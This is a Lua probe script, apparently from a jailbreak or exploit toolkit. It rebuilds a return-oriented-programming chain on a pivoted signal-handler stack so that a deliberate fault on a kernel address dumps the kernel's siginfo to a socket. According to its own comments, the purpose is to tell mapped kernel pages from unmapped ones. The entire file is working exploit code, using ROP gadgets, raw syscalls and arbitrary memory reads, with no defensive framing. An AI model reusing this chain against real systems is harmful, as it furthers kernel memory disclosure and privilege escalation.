-- CRASH_CLASS: HIGH
-- PROBE 993a: rebuild the signal pivot chain so the handler dumps the kernel's siginfo
--
-- The loader's handler is registered with SA_SIGINFO and pivots RSP to 0xfb0000bd, so
-- the chain at that address decides what happens next. Its shipped chain copies
-- RDX (the ucontext), which has no si_code and no si_addr. The chain here leaves RSI
-- alone — at handler entry RSI is the siginfo pointer — and writes 0x80 bytes of it to
-- the client socket, which is the one thing that separates a mapped kernel page from an
-- unmapped one.

print("=== PROBE 993a: SIGINFO DUMP ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) else return nil end end

print(string.format("[A] pid=%u", to_num(mk(20)())))
print(string.format("[B] ropchain=%s signal=%s gadgets=%s", type(ropchain), type(signal), type(gadgets)))
if type(gadgets) ~= "table" or type(gadgets.stack_pivot) ~= "table" then
    print("[B] ABORT: no pivot gadget table")
    return
end
local ph = gadgets.stack_pivot[1]
local pivot_addr = to_num(ph.pivot_addr)
local pivot_base = to_num(ph.pivot_base)
print(string.format("[C] gadget=0x%X pivot=0x%X base=0x%X", to_num(ph.gadget_addr), pivot_addr, pivot_base))
print(string.format("[D] write.fn_addr=0x%X write.no=0x%X", to_num(syscall.write.fn_addr), to_num(syscall.write.syscall_no)))
local fd_addr = as_addr(signal.fd_addr)
print(string.format("[E] fd_addr=0x%X holds=%s", fd_addr, tostring(rq(fd_addr))))

-- build our chain on the same pivot page
local chain = ropchain({ stack_base = pivot_addr })
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x80)
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
print("[F] chain rebuilt, faulting on a kernel address")

local ok, err = pcall(function() return memory.read_qword(0xFFFFFFFF80000000) end)
print(string.format("[G] returned ok=%s", tostring(ok)))
print("=== COMPLETE ===")
